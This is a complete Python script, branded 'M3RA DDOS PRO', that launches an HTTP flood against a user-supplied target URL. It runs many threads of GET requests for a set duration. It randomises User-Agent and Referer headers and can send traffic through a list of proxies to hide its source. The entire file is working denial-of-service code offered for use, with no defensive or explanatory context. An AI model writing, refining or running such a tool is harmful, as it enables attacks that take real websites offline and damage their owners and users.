
# Filename: m3ra_ddos_pro.py

import requests, threading, random, time
from colorama import Fore, Style
from rich.console import Console
from rich.progress import track

console = Console()
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Linux; Android 11)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
]

referers = ["https://google.com", "https://bing.com", "https://duckduckgo.com"]

def attack(url, duration, use_proxy=False):
    end_time = time.time() + duration
    total_sent = 0

    while time.time() < end_time:
        try:
            headers = {
                'User-Agent': random.choice(user_agents),
                'Referer': random.choice(referers)
            }

            if use_proxy:
                proxy = random.choice(open("proxies.txt").read().splitlines())
                proxies = {
                    'http': f'http://{proxy}',
                    'https': f'http://{proxy}',
                }
            else:
                proxies = None

            response = requests.get(url, headers=headers, proxies=proxies, timeout=3)
            total_sent += 1
            console.print(f"[green]Sent Request [{response.status_code}] -> {url}[/green]")

        except Exception as e:
            console.print(f"[red]Failed: {e}[/red]")
            continue

    console.print(f"[bold yellow]Attack Finished. Total Requests Sent: {total_sent}[/bold yellow]")

def main():
    print(Fore.CYAN + "====== M3RA DDOS PRO - v1.0 ======")
    url = input("Target URL (e.g. https://example.com): ").strip()
    threads = int(input("Number of Threads: "))
    seconds = int(input("Attack Duration (in seconds): "))
    proxy = input("Use Proxy? (yes/no): ").lower() == 'yes'

    print(Fore.YELLOW + "\nLaunching attack...\n" + Style.RESET_ALL)

    for _ in track(range(threads), description="[red]Launching Threads...[/red]"):
        t = threading.Thread(target=attack, args=(url, seconds, proxy))
        t.daemon = True
        t.start()

    time.sleep(seconds + 5)

if __name__ == "__main__":
    main()
